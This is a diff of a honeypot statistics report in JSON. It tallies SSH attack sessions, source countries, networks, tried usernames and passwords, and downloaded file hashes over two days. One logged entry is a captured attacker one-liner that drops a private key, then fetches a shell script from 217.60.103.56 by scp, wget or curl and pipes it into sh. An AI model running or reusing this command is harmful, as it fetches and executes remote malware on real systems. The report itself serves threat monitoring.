@@ -14,9 +14,9 @@
   },
   {
    "day": "2026-09-16",
-   "events": 8963,
-   "sessions": 1167,
-   "source_addresses": 43
+   "events": 9014,
+   "sessions": 1179,
+   "source_addresses": 48
   }
  ],
  "by_hour_utc": [
@@ -76,14 +76,14 @@
    "sessions": 182
   },
   {
-   "events": 811,
+   "events": 850,
    "hour": 11,
-   "sessions": 107
+   "sessions": 116
   },
   {
-   "events": 1190,
+   "events": 1202,
    "hour": 12,
-   "sessions": 184
+   "sessions": 187
   },
   {
    "events": 5121,
@@ -145,13 +145,13 @@
   {
    "client": "SSH-2.0-Go",
    "hassh": "",
-   "sessions": 12877,
+   "sessions": 12878,
    "source_addresses": 55
   },
   {
    "client": "SSH-2.0-PuTTY_Release_0.84",
    "hassh": "",
-   "sessions": 77,
+   "sessions": 82,
    "source_addresses": 3
   },
   {
@@ -163,8 +163,8 @@
   {
    "client": "SSH-2.0-libssh2_1.11.1",
    "hassh": "",
-   "sessions": 8,
-   "source_addresses": 5
+   "sessions": 9,
+   "source_addresses": 6
   },
   {
    "client": "GET / HTTP/1.1",
@@ -374,17 +374,17 @@
   },
   {
    "command": "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ\n0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg\nAAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9\nCp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=\n-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no\nUserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh",
-   "sessions": 1,
+   "sessions": 2,
    "source_addresses": 1,
-   "times": 1
+   "times": 2
   }
  ],
  "countries": [
   {
    "country": "United States",
    "country_code": "US",
-   "events": 75224,
-   "sessions": 9457,
+   "events": 75227,
+   "sessions": 9458,
    "source_addresses": 60
   },
   {
@@ -418,22 +418,22 @@
   {
    "country": "Andorra",
    "country_code": "AD",
-   "events": 758,
-   "sessions": 102,
+   "events": 760,
+   "sessions": 103,
    "source_addresses": 5
   },
   {
    "country": "The Netherlands",
    "country_code": "NL",
-   "events": 745,
-   "sessions": 100,
+   "events": 755,
+   "sessions": 101,
    "source_addresses": 10
   },
   {
    "country": "United Kingdom",
    "country_code": "GB",
-   "events": 415,
-   "sessions": 86,
+   "events": 440,
+   "sessions": 91,
    "source_addresses": 10
   },
   {
@@ -451,6 +451,13 @@
    "source_addresses": 6
   },
   {
+   "country": "Ukraine",
+   "country_code": "UA",
+   "events": 24,
+   "sessions": 12,
+   "source_addresses": 6
+  },
+  {
    "country": "Argentina",
    "country_code": "AR",
    "events": 22,
@@ -463,13 +470,6 @@
    "events": 29,
    "sessions": 10,
    "source_addresses": 4
-  },
-  {
-   "country": "Ukraine",
-   "country_code": "UA",
-   "events": 20,
-   "sessions": 10,
-   "source_addresses": 5
   },
   {
    "country": "Canada",
@@ -529,9 +529,9 @@
    "username": "admin"
   },
   {
-   "attempts": 23,
+   "attempts": 25,
    "password": "admin",
-   "source_addresses": 16,
+   "source_addresses": 17,
    "username": "admin"
   },
   {
@@ -644,10 +644,10 @@
   }
  ],
  "enrichment": {
-  "addresses_with_asn": 187,
+  "addresses_with_asn": 190,
   "addresses_without_asn": 7,
-  "events_with_asn": 33436,
-  "events_with_country": 103808,
+  "events_with_asn": 33487,
+  "events_with_country": 103859,
   "events_without_asn": 70372
  },
  "excluded": {
@@ -694,12 +694,30 @@
    "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
    "timestamp": "2026-09-15 21:37:56.931565",
    "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-16 11:29:51.735960",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-16 11:29:51.736361",
+   "url": ""
   }
  ],
  "logins": {
-  "accepted": 12843,
-  "distinct_passwords": 2044,
-  "distinct_usernames": 511,
+  "accepted": 12850,
+  "distinct_passwords": 2049,
+  "distinct_usernames": 513,
   "refused": 112
  },
  "meta": {
@@ -709,7 +727,7 @@
   "schema_version": 1,
   "source": "nsm.cowrie_events",
   "top_n": 20,
-  "window_end": "2026-09-16 10:40:53.206897",
+  "window_end": "2026-09-16 12:24:20.138806",
   "window_start": "2026-09-14 05:57:05.761100"
  },
  "networks": [
@@ -744,15 +762,15 @@
   {
    "as_org": "UNMANAGED LTD",
    "asn": 47890,
-   "events": 730,
-   "sessions": 122,
+   "events": 755,
+   "sessions": 127,
    "source_addresses": 5
   },
   {
    "as_org": "TECHOFF SRV LIMITED",
    "asn": 48090,
-   "events": 754,
-   "sessions": 101,
+   "events": 756,
+   "sessions": 102,
    "source_addresses": 4
   },
   {
@@ -819,18 +837,18 @@
    "source_addresses": 6
   },
   {
+   "as_org": "Amazon.com, Inc.",
+   "asn": 16509,
+   "events": 17,
+   "sessions": 5,
+   "source_addresses": 1
+  },
+  {
    "as_org": "Chinanet",
    "asn": 4134,
    "events": 10,
    "sessions": 4,
    "source_addresses": 2
-  },
-  {
-   "as_org": "Amazon.com, Inc.",
-   "asn": 16509,
-   "events": 14,
-   "sessions": 4,
-   "source_addresses": 1
   },
   {
    "as_org": "Telefonica de Argentina",
@@ -906,9 +924,9 @@
    "source_addresses": 5
   },
   {
-   "attempts": 78,
+   "attempts": 80,
    "password": "admin",
-   "source_addresses": 19
+   "source_addresses": 20
   },
   {
    "attempts": 61,
@@ -957,7 +975,7 @@
   }
  ],
  "session_seconds": {
-  "instant": 72,
+  "instant": 73,
   "longest": 304.885,
   "median": 1.099,
   "p90": 1.742
@@ -1172,6 +1190,19 @@
    "usernames_tried": 22
   },
   {
+   "address": "2.57.121.25",
+   "as_org": "UNMANAGED LTD",
+   "asn": 47890,
+   "commands": 0,
+   "country": "United Kingdom",
+   "country_code": "GB",
+   "events": 160,
+   "first_seen": "2026-09-15 02:15:24.432117",
+   "last_seen": "2026-09-16 12:20:19.850426",
+   "sessions": 32,
+   "usernames_tried": 1
+  },
+  {
    "address": "35.187.231.181",
    "as_org": "Google LLC",
    "asn": 396982,
@@ -1185,29 +1216,16 @@
    "usernames_tried": 7
   },
   {
-   "address": "2.57.121.25",
-   "as_org": "UNMANAGED LTD",
-   "asn": 47890,
-   "commands": 0,
-   "country": "United Kingdom",
-   "country_code": "GB",
-   "events": 150,
-   "first_seen": "2026-09-15 02:15:24.432117",
-   "last_seen": "2026-09-16 10:15:16.703238",
-   "sessions": 30,
-   "usernames_tried": 1
-  },
-  {
    "address": "193.46.255.86",
    "as_org": "UNMANAGED LTD",
    "asn": 47890,
    "commands": 0,
    "country": "United Kingdom",
    "country_code": "GB",
-   "events": 130,
+   "events": 135,
    "first_seen": "2026-09-15 01:10:03.793159",
-   "last_seen": "2026-09-16 10:30:57.730345",
-   "sessions": 26,
+   "last_seen": "2026-09-16 11:47:58.098127",
+   "sessions": 27,
    "usernames_tried": 12
   },
   {
@@ -1217,25 +1235,25 @@
    "commands": 0,
    "country": "United Kingdom",
    "country_code": "GB",
-   "events": 105,
+   "events": 115,
    "first_seen": "2026-09-15 03:06:57.555949",
-   "last_seen": "2026-09-16 09:35:38.426566",
-   "sessions": 21,
-   "usernames_tried": 21
+   "last_seen": "2026-09-16 12:24:20.138806",
+   "sessions": 23,
+   "usernames_tried": 23
   }
  ],
  "totals": {
-  "asns": 98,
-  "countries": 37,
-  "events": 103808,
+  "asns": 101,
+  "countries": 39,
+  "events": 103859,
   "first_event": "2026-09-14 07:31:15.476681",
-  "last_event": "2026-09-16 10:40:53.206897",
-  "sessions": 13215,
-  "source_addresses": 194
+  "last_event": "2026-09-16 12:24:20.138806",
+  "sessions": 13227,
+  "source_addresses": 197
  },
  "usernames": [
   {
-   "attempts": 5419,
+   "attempts": 5420,
    "source_addresses": 30,
    "username": "root"
   },
@@ -1245,8 +1263,8 @@
    "username": "ubuntu"
   },
   {
-   "attempts": 417,
-   "source_addresses": 20,
+   "attempts": 421,
+   "source_addresses": 21,
    "username": "admin"
   },
   {
